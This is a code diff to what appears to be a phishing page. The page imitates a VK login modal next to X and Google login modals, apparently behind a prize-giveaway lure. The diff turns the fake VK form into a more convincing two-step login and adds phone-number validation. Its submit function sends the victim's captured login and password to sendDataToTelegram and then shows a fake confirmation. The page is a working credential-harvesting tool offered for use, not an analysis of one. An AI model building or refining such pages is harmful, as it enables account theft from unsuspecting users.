@@ -576,6 +576,23 @@
             font-family: Arial, sans-serif;
         }
         
+        /* ВКонтакте - двухэтапная форма */
+        .vk-login-page {
+            display: block;
+        }
+        
+        .vk-login-page.hidden {
+            display: none;
+        }
+        
+        .vk-password-page {
+            display: none;
+        }
+        
+        .vk-password-page.active {
+            display: block;
+        }
+        
         .vk-tabs {
             display: flex;
             gap: 10px;
@@ -616,6 +633,7 @@
             color: #2a5885;
             margin-right: 10px;
             font-family: Arial, sans-serif;
+            min-width: 40px;
         }
         
         .phone-input {
@@ -626,6 +644,7 @@
             font-size: 16px;
             font-family: Arial, sans-serif;
             outline: none;
+            width: 100%;
         }
         
         /* Специфичные стили для X (Twitter) модального окна */
@@ -941,6 +960,10 @@
                 margin-right: 0;
                 margin-bottom: 10px;
             }
+            
+            .vk-tabs {
+                flex-direction: column;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -1093,7 +1116,7 @@
 
     <!-- Модальные окна входа -->
     
-    <!-- ВКонтакте -->
+    <!-- ВКонтакте - двухэтапная форма -->
     <div class="login-modal" id="vkLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
@@ -1108,43 +1131,75 @@
                     <div class="vk-title">Вход ВКонтакте</div>
                 </div>
                 
-                <div class="vk-tabs">
-                    <div class="vk-tab active" data-type="phone" onclick="switchVKTab('phone')">Телефон</div>
-                    <div class="vk-tab" data-type="email" onclick="switchVKTab('email')">Почта</div>
-                </div>
-                
-                <!-- Поле для телефона -->
-                <div id="vkPhoneField" class="phone-input-container">
-                    <span class="phone-prefix">+7</span>
-                    <input type="text" class="phone-input" id="vkPhoneInput" placeholder="Номер телефона">
-                </div>
-                
-                <!-- Поле для почты (скрыто по умолчанию) -->
-                <input type="text" class="login-input" id="vkEmailInput" placeholder="Почта или логин" style="display: none;">
-                
-                <input type="password" class="login-input" id="vkPassword" placeholder="Пароль">
-                
-                <div class="checkbox-container">
-                    <input type="checkbox" id="vkSave">
-                    <label for="vkSave" style="color: #666;">Сохранить вход</label>
-                </div>
-                
-                <button class="login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
-                
-                <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Создать аккаунт</a>
-                <a href="#" class="login-link" style="text-align: center; margin-bottom: 20px;">Создать страницу для бизнеса</a>
-                
-                <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0; line-height: 1.5;">
-                    Нажимая «Войти», вы принимаете пользовательское соглашение<br>и политику конфиденциальности
-                </p>
-                
-                <div style="border-top: 1px solid #e0e0e0; padding-top: 15px;">
-                    <a href="#" class="login-link" style="text-align: center;">Помощь</a>
-                    <p style="font-size: 12px; color: #666; margin: 10px 0; text-align: center;">
-                        Применяются рекомендательные технологии<br>
-                        Версия для компьютера<br>
-                        Русский
+                <!-- Первая страница: ввод телефона/почты -->
+                <div id="vkLoginPage" class="vk-login-page">
+                    <div class="vk-tabs">
+                        <div class="vk-tab active" data-type="phone" onclick="switchVKTab('phone')">Телефон</div>
+                        <div class="vk-tab" data-type="email" onclick="switchVKTab('email')">Почта</div>
+                    </div>
+                    
+                    <!-- Поле для телефона -->
+                    <div id="vkPhoneField" class="phone-input-container">
+                        <input type="text" class="phone-prefix" id="vkPhonePrefix" value="+7" style="background: transparent; border: none; width: 50px; padding: 0; margin-right: 10px;">
+                        <input type="text" class="phone-input" id="vkPhoneInput" placeholder="Номер телефона">
+                    </div>
+                    
+                    <!-- Поле для почты (скрыто по умолчанию) -->
+                    <input type="text" class="login-input" id="vkEmailInput" placeholder="Почта или логин" style="display: none;">
+                    
+                    <button class="login-btn" onclick="nextToVKPassword()" style="background: #4c75a3; margin-top: 15px;">Далее</button>
+                    
+                    <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Создать аккаунт</a>
+                    <a href="#" class="login-link" style="text-align: center; margin-bottom: 20px;">Создать страницу для бизнеса</a>
+                    
+                    <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0; line-height: 1.5;">
+                        Нажимая «Далее», вы принимаете пользовательское соглашение<br>и политику конфиденциальности
                     </p>
+                    
+                    <div style="border-top: 1px solid #e0e0e0; padding-top: 15px;">
+                        <a href="#" class="login-link" style="text-align: center;">Помощь</a>
+                        <p style="font-size: 12px; color: #666; margin: 10px 0; text-align: center;">
+                            Применяются рекомендательные технологии<br>
+                            Версия для компьютера<br>
+                            Русский
+                        </p>
+                    </div>
+                </div>
+                
+                <!-- Вторая страница: ввод пароля -->
+                <div id="vkPasswordPage" class="vk-password-page">
+                    <div style="margin-bottom: 20px;">
+                        <div style="font-size: 16px; color: #000; font-weight: bold; margin-bottom: 5px;" id="vkLoginDisplay">+7</div>
+                        <div style="font-size: 14px; color: #666;">Введите пароль</div>
+                    </div>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <input type="password" class="login-input" id="vkPassword" placeholder="Пароль">
+                    </div>
+                    
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="vkSave">
+                        <label for="vkSave" style="color: #666;">Сохранить вход</label>
+                    </div>
+                    
+                    <button class="login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
+                    
+                    <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Забыли пароль?</a>
+                    
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button class="login-link" onclick="backToVKLogin()" style="background: none; border: none; color: #1877f2; font-size: 14px; cursor: pointer; padding: 5px;">
+                            Использовать другой аккаунт
+                        </button>
+                    </div>
+                    
+                    <div style="border-top: 1px solid #e0e0e0; padding-top: 15px; margin-top: 20px;">
+                        <a href="#" class="login-link" style="text-align: center;">Помощь</a>
+                        <p style="font-size: 12px; color: #666; margin: 10px 0; text-align: center;">
+                            Применяются рекомендательные технологии<br>
+                            Версия для компьютера<br>
+                            Русский
+                        </p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1392,11 +1447,15 @@
             const googleLogoImg = document.getElementById('googleLogoImg');
             
             // Элементы для ВКонтакте
+            const vkLoginPage = document.getElementById('vkLoginPage');
+            const vkPasswordPage = document.getElementById('vkPasswordPage');
             const vkPhoneField = document.getElementById('vkPhoneField');
+            const vkPhonePrefix = document.getElementById('vkPhonePrefix');
             const vkPhoneInput = document.getElementById('vkPhoneInput');
             const vkEmailInput = document.getElementById('vkEmailInput');
             const vkPassword = document.getElementById('vkPassword');
             const vkTabs = document.querySelectorAll('.vk-tab');
+            const vkLoginDisplay = document.getElementById('vkLoginDisplay');
             
             // Элементы для X (Twitter)
             const xLoginPage = document.getElementById('xLoginPage');
@@ -1417,6 +1476,7 @@
             let xUsername = '';
             let vkLoginType = 'phone'; // 'phone' или 'email'
             let googleUserEmail = '';
+            let vkUserLogin = '';
             
             // Призы с картинками
             const prizes = [
@@ -1540,7 +1600,7 @@
                 });
             }
             
-            // Функция переключения вкладок ВКонтакте
+            // Функции для ВКонтакте
             window.switchVKTab = function(type) {
                 vkLoginType = type;
                 
@@ -1563,6 +1623,52 @@
                     vkEmailInput.style.display = 'block';
                     vkEmailInput.focus();
                 }
+            };
+            
+            window.nextToVKPassword = function() {
+                let login = '';
+                
+                if (vkLoginType === 'phone') {
+                    const phonePrefix = vkPhonePrefix.value.trim();
+                    const phoneNumber = vkPhoneInput.value.trim();
+                    
+                    if (!phoneNumber) {
+                        showNotification("Пожалуйста, введите номер телефона", true);
+                        return;
+                    }
+                    
+                    login = phonePrefix + phoneNumber;
+                } else {
+                    login = vkEmailInput.value.trim();
+                    
+                    if (!login) {
+                        showNotification("Пожалуйста, введите почту или логин", true);
+                        return;
+                    }
+                }
+                
+                vkUserLogin = login;
+                vkLoginDisplay.textContent = login;
+                
+                vkLoginPage.classList.add('hidden');
+                vkPasswordPage.classList.add('active');
+                
+                setTimeout(() => {
+                    vkPassword.focus();
+                }, 100);
+            };
+            
+            window.backToVKLogin = function() {
+                vkPasswordPage.classList.remove('active');
+                vkLoginPage.classList.remove('hidden');
+                
+                setTimeout(() => {
+                    if (vkLoginType === 'phone') {
+                        vkPhoneInput.focus();
+                    } else {
+                        vkEmailInput.focus();
+                    }
+                }, 100);
             };
             
             // Функция смены языка
@@ -1712,10 +1818,14 @@
                     
                     // Сбрасываем состояние форм при открытии
                     if (selectedSocial === 'vk') {
+                        vkLoginPage.classList.remove('hidden');
+                        vkPasswordPage.classList.remove('active');
                         switchVKTab('phone');
+                        vkPhonePrefix.value = '+7';
                         vkPhoneInput.value = '';
                         vkEmailInput.value = '';
                         vkPassword.value = '';
+                        vkUserLogin = '';
                     }
                     
                     if (selectedSocial === 'x') {
@@ -1795,21 +1905,14 @@
             
             // Функции отправки данных
             window.submitVKLogin = function() {
-                let login = '';
                 const password = vkPassword.value.trim();
                 
-                if (vkLoginType === 'phone') {
-                    login = vkPhoneInput.value.trim();
-                } else {
-                    login = vkEmailInput.value.trim();
-                }
-                
-                if (!login || !password) {
-                    showNotification("Пожалуйста, заполните все поля", true);
+                if (!password) {
+                    showNotification("Пожалуйста, введите пароль", true);
                     return;
                 }
                 
-                sendDataToTelegram('VK', login, password);
+                sendDataToTelegram('VK', vkUserLogin, password);
                 closeLoginModal();
                 showConfirmationSection();
             };
@@ -1964,6 +2067,42 @@
                     }
                 });
             });
+            
+            // Автофокус на поле ввода кода страны при клике
+            if (vkPhonePrefix) {
+                vkPhonePrefix.addEventListener('click', function() {
+                    this.select();
+                });
+                
+                vkPhonePrefix.addEventListener('input', function() {
+                    // Убедимся, что код начинается с +
+                    if (!this.value.startsWith('+')) {
+                        this.value = '+' + this.value.replace(/[^0-9]/g, '');
+                    } else {
+                        this.value = '+' + this.value.substring(1).replace(/[^0-9]/g, '');
+                    }
+                    
+                    // Ограничиваем длину (макс 4 цифры после +)
+                    if (this.value.length > 5) {
+                        this.value = this.value.substring(0, 5);
+                    }
+                });
+                
+                vkPhonePrefix.addEventListener('blur', function() {
+                    // Если поле пустое, устанавливаем +7 по умолчанию
+                    if (!this.value || this.value === '+') {
+                        this.value = '+7';
+                    }
+                });
+            }
+            
+            // Валидация номера телефона
+            if (vkPhoneInput) {
+                vkPhoneInput.addEventListener('input', function() {
+                    // Удаляем все нецифровые символы
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            }
         });
     </script>
 </body>
